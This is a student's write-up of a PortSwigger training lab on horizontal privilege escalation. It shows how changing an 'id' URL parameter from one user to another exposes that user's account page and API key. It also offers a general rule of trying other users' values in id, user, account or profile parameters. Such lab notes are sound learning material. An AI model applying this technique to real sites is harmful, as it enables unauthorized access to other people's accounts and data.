# Lab07 - User ID Controlled By Request Parameter

## Objective

Retrieve the API key for:

```text
carlos
```

---

# Lab Information

| Field | Value |
|---------|---------|
| Category | Horizontal Privilege Escalation |
| Difficulty | Apprentice |
| Platform | PortSwigger |

---

# Vulnerability Overview

The application identifies users using a request parameter.

No ownership validation exists.

---

# Analysis

## Step 1

Login as:

```text
wiener
```

---

## Step 2

Visit:

```text
/my-account?id=wiener
```

---

## Step 3

Change:

```text
wiener
```

to:

```text
carlos
```

---

Modified URL:

```text
/my-account?id=carlos
```

---

## Step 4

Load page.

---

Result:

```text
Carlos Profile Displayed
```

---

## Step 5

Retrieve API key.

Lab solved.

---

# Full Payload Used

```text
/my-account?id=carlos
```

---

# Why It Works

Application validates:

```text
Authenticated User
```

but not:

```text
Resource Ownership
```

---

Execution Flow

```text
Parameter Modified
        ↓
Ownership Check Missing
        ↓
Carlos Data Returned
```

---

# Personal Analysis & Testing Process

## Initial Observation

Account determined by:

```text
id=
```

parameter.

---

## Key Thought

User-controlled identifiers often indicate IDOR.

---

## Test

Replace:

```text
wiener
```

with:

```text
carlos
```

---

## Result

Carlos account exposed.

Lab solved.

---

# Mental Model

Whenever you see:

```text
id=
user=
account=
profile=
```

try another user's value.

---

# Related Theory

- 07-horizontal-privilege-escalation.md
- 09-insecure-direct-object-references-idor.md

---

# Key Learnings

- Authentication is not authorization.
- User-controlled identifiers require ownership checks.